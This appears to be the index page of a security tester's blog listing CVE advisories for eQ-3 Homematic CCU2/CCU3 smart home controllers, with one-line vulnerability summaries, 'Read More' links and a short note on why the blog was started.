# [CVE-2019-13030 eQ-3 Homematic CCU3 AddOn 'Mediola NEO Server for Homematic CCU3' prior 2.4.5 allows uncontrolled admin access to start or stop the Node.js process, resulting in the ability to obtain mediola configuration details. This is related to improper access control for addons configuration pages and a missing check in rc.d/97NeoServer](/CVE-2019-13030/)

# Overview

[Read More](/CVE-2019-13030/)

# [CVE-2019-9585 eQ-3 Homematic CCU2 prior 2.47.10 and CCU3 prior 3.47.10 JSON API has Improper Access Control for Interface.\*\*\*Metadata related operations, resulting in the ability to read, set and deletion of Metadata](/CVE-2019-9585/)

# Overview

[Read More](/CVE-2019-9585/)

# [CVE-2019-9583 eQ-3 Homematic CCU2 and CCU3 obtain session IDs without login. This allows a Denial of Service and is a starting point for other attacks](/CVE-2019-9583/)

# Overview

[Read More](/CVE-2019-9583/)

# [How this blog started, because I own a Homematic "Smart Home" control unit.](/index/)

Testing is my passion. Sharing knowledge is my contribution.

Every family has a skeleton in the cupboard.

And I like to burn down software from testers point of view. Developers ….they “(dis)like me” :-)

For CVE submission and publication an external reference with CVE detail description is required.

Finally my blog was born.

[Read More](/index/)

# [Cve 2021 45093](/CVE-2021-45093/)

nothing yet

[Read More](/CVE-2021-45093/)

 [Mastodon](https://infosec.exchange/%40psytester)


